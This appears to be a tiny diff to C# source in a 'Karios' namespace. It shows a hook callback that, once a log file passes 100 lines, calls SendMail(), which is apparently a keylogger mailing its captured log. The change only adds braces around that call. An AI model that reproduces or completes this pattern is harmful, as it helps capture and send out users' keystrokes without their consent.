@@ -266,7 +266,9 @@ namespace Karios
 
             if (File.ReadAllLines(pathToLog).Length <= 100) return CallNextHookEx(_hookId, nCode, wParam, lParam);
             {
-                SendMail();
+                {
+                    SendMail();
+                }
             }
             /*
             try
